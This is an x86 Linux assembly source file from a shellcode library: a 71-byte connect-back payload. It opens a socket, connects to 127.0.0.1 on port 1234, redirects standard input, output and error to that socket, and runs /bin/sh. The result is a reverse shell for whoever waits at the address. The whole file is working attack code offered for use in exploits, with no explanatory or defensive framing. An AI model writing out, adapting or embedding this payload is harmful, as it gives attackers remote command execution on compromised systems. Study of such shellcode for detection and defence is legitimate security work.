/*
 *  $Id: lin-x86-cntsockcode.s 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-x86-cntsockcode.s
 *  Copyright 2004 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

# 71 bytes

cntsockcode:
    xorl    %ebx,%ebx
    mull    %ebx
    pushl   %ebx
    incl    %ebx
    pushl   %ebx
    pushl   $0x02
    movl    %esp,%ecx
    movb    $0x66,%al
    int     $0x80

    popl    %ebx
    popl    %esi
    pushl   $0x0100007f
    pushw   $0xd204
    pushw   %bx
    pushl   $0x10
    pushl   %ecx
    pushl   %eax
    movl    %esp,%ecx
    incl    %ebx
    pushl   $0x66
    popl    %eax
    int     $0x80

    popl    %ecx
    xchgl   %ebx,%ecx

0:
    movb    $0x3f,%al
    int     $0x80

    decl    %ecx
    jns     0b

shellcode:
#    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %ebx
    movl    %esp,%ecx
#    cltd
    movb    $0x0b,%al
    int     $0x80

